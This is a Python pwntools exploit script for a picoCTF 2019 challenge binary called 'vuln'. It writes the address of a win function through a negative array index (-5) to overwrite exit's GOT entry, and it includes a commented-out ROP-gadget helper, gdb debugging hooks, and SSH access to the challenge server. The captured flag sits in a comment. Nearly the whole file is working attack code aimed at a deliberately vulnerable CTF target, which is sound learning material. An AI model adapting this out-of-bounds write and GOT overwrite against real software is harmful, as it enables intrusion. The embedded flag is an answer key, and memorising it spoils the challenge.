from pwn import *
import sys
import subprocess
import r2pipe
# 
argv = sys.argv

DEBUG = True
BINARY = './vuln'
# picoCTF{str1nG_CH3353_89e2bdcf}
context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

# if context.bits == 64:
#   r = process(['ROPgadget', '--binary', BINARY])
#   gadgets = r.recvall().strip().split('\n')[2:-2]
#   gadgets = map(lambda x: x.split(' : '),gadgets)
#   gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
#   r.close()

#   pop_rdi = 0
#   pop_rsi_r15 = 0
#   pop_rdx = 0

#   for addr, name in gadgets:
#     if 'pop rdi ; ret' in name:
#       pop_rdi = addr
#     if 'pop rsi ; pop r15 ; ret' in name:
#       pop_rsi_r15 = addr
#     if 'pop rdx ; ret' in name:
#       pop_rdx = addr

#   def call(f, a1, a2, a3):
#     out = ''
#     if a1 != None:
#       out += p64(pop_rdi)+p64(a1)
#     if a2 != None:
#       out += p64(pop_rsi_r15)+p64(a2)*2
#     if a3 != None:
#       if pop_rdx == 0:
#         print 'RDX GADGET NOT FOUND'
#         exit(-1)
#       else:
#         out += p64(rdx)+p64(a3)
#     return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'


if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/l1im1tl355_1_ed217b748bc08aae9e9a5eebe0907fa0')
  REMOTE = True


# [0x080484b0]> pdf @sym.imp.exit
# / (fcn) sym.imp.exit 6
# |   void sym.imp.exit (int status);
# | bp: 0 (vars 0, args 0)
# | sp: 0 (vars 0, args 0)
# | rg: 0 (vars 0, args 0)
# |           ; CALL XREF from main @ 0x8048704
# \           0x08048450      ff2518a00408   jmp dword [reloc.exit]      ; 0x804a018 ; "V\x84\x04\bf\x84\x04\bv\x84\x04\b\x86\x84\x04\b\x96\x84\x04\b"

exit_got = 0x804a018
print (exit_got-0xffab843c)//4
win_addr = 0x080485c6
# sh.sendlineafter('array\n', str(0xdeadbeef))
sh.sendlineafter('array\n', str(win_addr))
sh.sendlineafter('value\n', str(-5))

sh.interactive()
